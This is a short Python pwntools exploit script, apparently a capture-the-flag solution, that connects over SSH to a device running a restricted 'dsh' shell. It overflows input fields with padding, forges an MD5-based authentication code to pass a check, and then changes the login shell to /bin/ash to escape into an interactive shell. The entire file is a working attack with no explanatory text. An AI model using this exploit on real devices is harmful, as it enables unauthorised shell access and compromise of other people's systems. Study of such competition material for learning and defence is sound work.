from pwn import *
import hashlib

s = ssh(user='pwn', host='192.168.1.1', password='rwctf')
r = s.shell()
# r = process(['qemu-mipsel', '-g', '1234', './dsh'])
# r = process(['qemu-mipsel', './dsh'])

r.recvuntil('(dsh)')
r.sendline('help')
r.recvuntil('Qrcode')
r.recvuntil('#')

r.sendline('shell')
r.recvuntil('Accounts')
r.sendline('1')
r.recvuntil('codes :')
r.sendline('x' * 0x21)
r.recvuntil('#')

pwd = hashlib.md5('g' * 0x29).hexdigest()
print(pwd)
r.sendline('shell ' + ('aaaaaaaaaaaaaaaa ' * 6) + ' ' + 'g' * 0x40 + ' hhhh xxxx')
r.recvuntil('Accounts')
r.sendline('1')
r.recvuntil('codes :')
r.sendline(hashlib.md5('g' * 0x29).hexdigest() + '\x00')

# r.recvuntil('#')
# r.sendline('diagnose')
r.sendline('\n\nchsh -s /bin/ash')

r.interactive()
r.close()
